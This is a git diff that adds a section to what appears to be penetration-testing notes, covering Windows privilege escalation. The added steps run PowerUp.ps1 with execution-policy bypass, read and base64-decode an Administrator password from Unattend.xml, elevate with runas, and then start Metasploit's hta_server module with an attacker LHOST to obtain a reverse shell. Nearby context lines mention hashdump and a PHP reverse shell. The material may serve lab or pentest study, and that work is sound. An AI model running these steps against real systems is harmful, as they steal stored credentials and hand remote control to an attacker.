@@ -335,6 +335,39 @@ migrate 496
 hashdump
 ```
 
+###  Privilege Escalation via PowerUp.ps1 + Unattend.xml + runas + HTA Reverse Shell
+
+1. On the **target machine**, navigate to PowerUp and run a privesc audit:
+
+   ```powershell
+   cd .\Desktop\PowerSploit\Privesc\
+   powershell -ep bypass
+   . .\PowerUp.ps1
+   Invoke-PrivescAudit
+   ```
+   
+2. Read and decode the password securely (redacted here):
+ ```powershell
+cat C:\Windows\Panther\Unattend.xml
+$password = '<base64_string>'
+$password = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($password))
+```
+
+3. Use runas to elevate to Administrator (use the decoded password):
+
+ ```cmd
+runas.exe /user:Administrator cmd
+whoami
+```
+4. On the attacker machine, run:
+
+ ```bash
+msfconsole -q
+use exploit/windows/misc/hta_server
+set LHOST <attacker_ip>
+exploit
+```
+
 #### PHP Reverse Shell Example
 
 ```php
